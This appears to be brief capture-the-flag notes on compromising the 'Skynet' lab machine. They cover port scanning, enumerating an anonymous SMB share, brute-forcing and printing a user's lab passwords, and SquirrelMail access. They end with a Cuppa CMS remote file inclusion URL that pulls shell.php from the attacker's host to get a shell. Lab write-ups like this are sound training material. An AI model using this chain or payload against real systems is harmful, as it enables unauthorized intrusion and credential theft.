nmap

PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
110/tcp   open     pop3
139/tcp   open     netbios-ssn
143/tcp   open     imap
445/tcp   open     microsoft-ds
30644/tcp filtered unknown


***

http

ffuf

/admin
/config
/js
/squirrelmail --> looks interesting

```
http://10.10.139.167/squirrelmail/src/login.php

SquirrelMail version 1.4.23 [SVN]
By the SquirrelMail Project Team

```

found exploit but nedd creds.

***

smb

```
smbclient -L //$ip/                                                                                           1 ⨯
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available


```

we can login in into anonymous share.

download some files form share.

`attention.txt  log1.txt  log2.txt  log3.txt`


attention.txt
```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson


```

user found : miles dyson, milesdyson

log1.txt is wordlist. ---> some bruteforcinng involed.
other ifles are empt.

try to brutforce milesdyson password with above wordlist.
ssh --> not found
smb --> not found

***

milesdyson : cyborg007haloterminator

login in squiremail 

found pw for smb : `)s{A&2Z=F^n_E.B\`	

login smb as user milesdyson.

got important.txt

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife


```

ffuf the cms directory.
/administrator --> cuppa cms --> rfi exploit.

```
http://10.10.139.167/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.57.82/shell.php

```

get shell as www-data.

use gtfobins for privs